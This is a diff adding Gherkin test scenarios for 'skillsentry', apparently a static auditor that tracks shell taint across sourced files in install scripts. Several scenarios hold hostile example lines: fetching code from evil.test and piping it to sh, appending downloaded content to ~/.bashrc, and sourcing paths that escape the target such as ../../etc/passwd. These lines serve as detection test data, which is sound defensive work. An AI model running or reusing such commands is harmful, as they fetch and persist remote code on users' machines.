@@ -830,3 +830,155 @@ Feature: skillsentry static supply-chain audit
     Given the analyzer operating on a FileRecord's content string
     When it tracks taint to a sink
     Then it touches no filesystem and spawns no process
+
+  # ── R9b.1: cross-file shell taint within the audited target (ADR-007) ──────
+
+  @EARS-067
+  Scenario: A literal relative source include is resolved in-memory (happy)
+    Given an install.sh that contains "source ./lib.sh" and a sibling lib.sh in the same target
+    When the auditor analyses install.sh for cross-file taint
+    Then it resolves ./lib.sh by looking up the sibling among the in-memory files
+    And it never reads the filesystem, opens a network connection, or executes the script
+
+  @EARS-067
+  Scenario: A dynamic source of a variable target is left to the intra-file sink (unhappy)
+    Given an install.sh that contains "source \"$F\"" where F is a tainted variable
+    When the auditor analyses install.sh
+    Then the cross-file resolver does not treat "$F" as a resolvable literal include
+    And the existing intra-file rule owns it as a source-of-a-tainted-target sink
+
+  @EARS-067
+  Scenario: A remote source target cannot resolve to a sibling (abuse)
+    Given an install.sh that contains "source <(curl https://evil.test/x)"
+    When the auditor analyses install.sh for cross-file taint
+    Then the include does not resolve to any in-memory sibling and is never fetched
+
+  @EARS-068
+  Scenario: Taint exported by a sourced sibling seeds the analysed file (happy)
+    Given a lib.sh that sets URL=$(get_secret) and an install.sh that sources ./lib.sh
+    When the auditor analyses install.sh
+    Then URL is imported as tainted into install.sh's initial taint set
+
+  @EARS-068
+  Scenario: A sourced sibling with no tainted exports imports nothing (unhappy)
+    Given a lib.sh of pure helper functions with no tainted source and an install.sh that sources it
+    When the auditor analyses install.sh
+    Then no taint is imported from lib.sh
+
+  @EARS-068
+  Scenario: Transitive one-hop source chains import taint (abuse)
+    Given a.sh sources b.sh, and b.sh sets P=$(curl -s https://evil.test) and is sourced by a.sh
+    When the auditor analyses a.sh
+    Then P's taint reaches a.sh through the one-hop chain
+
+  @EARS-069
+  Scenario: A source include escaping the target root is a finding (abuse — path traversal)
+    Given an install.sh that contains "source ../../etc/evil.sh"
+    When the auditor analyses install.sh for cross-file taint
+    Then a high-severity dataflow-taint finding is raised at the source line
+    And the out-of-tree target is never read
+
+  @EARS-069
+  Scenario: An in-tree relative source that stays within the root is not a traversal finding (happy)
+    Given an install.sh in dir/ that contains "source ../shared/lib.sh" resolving inside the target
+    When the auditor analyses install.sh
+    Then no path-traversal finding is raised for the include itself
+
+  @EARS-069
+  Scenario: A deeply nested escape is still caught (unhappy)
+    Given an install.sh that contains "source ./a/../../../outside.sh"
+    When the auditor normalises the include path in string space
+    Then the normalised path begins with .. and a traversal finding is raised
+
+  @EARS-070
+  Scenario: A source cycle terminates (abuse)
+    Given a.sh sources b.sh and b.sh sources a.sh
+    When the auditor resolves includes transitively
+    Then a visited-set prevents infinite recursion and analysis terminates
+
+  @EARS-070
+  Scenario: A missing sibling import is conservative (unhappy)
+    Given an install.sh that sources ./lib.sh but no lib.sh is enumerated in the target
+    When the auditor analyses install.sh
+    Then no taint is imported and no finding is raised for that include
+
+  @EARS-070
+  Scenario: An ignored sibling supplies no taint (happy)
+    Given a lib.sh excluded by .skillsentryignore and an install.sh that sources it
+    When the auditor analyses install.sh
+    Then no taint is imported from the excluded sibling
+
+  @EARS-071
+  Scenario: Imported taint reaching a shell pipe BLOCKs at the sink file:line (abuse — the core catch)
+    Given lib.sh sets URL=$(get_secret) and install.sh sources ./lib.sh then runs curl "$URL" | sh
+    When the target is audited
+    Then a high-severity dataflow-taint BLOCK is raised at the sink line in install.sh
+    And the finding is tier T1 with OWASP and MITRE ATLAS ids
+    And the excerpt notes the sourced file lib.sh
+
+  @EARS-071
+  Scenario: Imported taint written to an autorun location BLOCKs (abuse)
+    Given lib.sh sets H=$(curl -s https://evil.test/h) and install.sh sources it then appends "$H" to ~/.bashrc
+    When the target is audited
+    Then a high-severity dataflow-taint BLOCK is raised at the autorun-write line in install.sh
+
+  @EARS-071
+  Scenario: Imported taint that never sinks raises nothing (happy)
+    Given lib.sh sets V=$(date) and install.sh sources it then only echoes "$V"
+    When the target is audited
+    Then no dataflow-taint finding is raised
+
+  @EARS-072
+  Scenario: The split-across-files payload is caught only cross-file (abuse — load-bearing proof)
+    Given lib.sh sets URL=$(get_secret) and install.sh sources ./lib.sh then pipes "$URL" to sh
+    When the R9b intra-file analyzer is run over each file in isolation
+    Then neither file alone raises a finding
+    But when the cross-file analyzer is run over the whole set a BLOCK is raised at the sink
+
+  @EARS-072
+  Scenario: The single-file equivalent is still caught intra-file (happy)
+    Given a single install.sh that both sets URL=$(get_secret) and pipes "$URL" to sh
+    When the auditor analyses it
+    Then the intra-file R9b analysis already raises the finding
+
+  @EARS-072
+  Scenario: Splitting the source and sink the other way is also caught (unhappy)
+    Given install.sh sets the tainted SOURCE and sources a lib.sh that contains the SINK using it
+    When the target is audited
+    Then the cross-file analysis raises a BLOCK at the sink line in lib.sh
+
+  @EARS-073
+  Scenario: A benign multi-file bundle that sources a helper and pins a download PASSes (happy/benign)
+    Given install.sh sources ./lib.sh (helper functions) then downloads a pinned, sha256-verified asset to a file
+    When the target is audited
+    Then no dataflow-taint finding is raised and the verdict is PASS
+
+  @EARS-073
+  Scenario: A benign helper whose captured value is only echoed PASSes (unhappy/benign)
+    Given lib.sh sets VER=$(cat VERSION) and install.sh sources it then only echoes the version
+    When the target is audited
+    Then no dataflow-taint finding is raised and the verdict is PASS
+
+  @EARS-073
+  Scenario: A benign bundle near the boundary (sourced helper + non-autorun file write) PASSes (abuse/benign near-miss)
+    Given install.sh sources ./lib.sh and writes a captured value to build/out.txt (a non-autorun file)
+    When the target is audited
+    Then no dataflow-taint finding is raised and the verdict is PASS
+
+  @EARS-074
+  Scenario: Cross-file analysis never executes any sourced script (happy — safety invariant)
+    Given a malicious multi-file bundle whose payload would touch a sentinel file if executed
+    When the auditor performs cross-file T1 dataflow analysis over it
+    Then the sentinel file is never created and the analysis completes in pure string space
+
+  @EARS-074
+  Scenario: Cross-file resolution never fetches a remote include (abuse)
+    Given an install.sh that sources a remote URL target
+    When the auditor resolves includes
+    Then it never opens a network connection and never fetches the target
+
+  @EARS-074
+  Scenario: Cross-file resolution never reads outside the in-memory file set (unhappy)
+    Given an install.sh that sources ../../etc/passwd
+    When the auditor resolves the include
+    Then it reads no filesystem path and only reports the escape as a finding
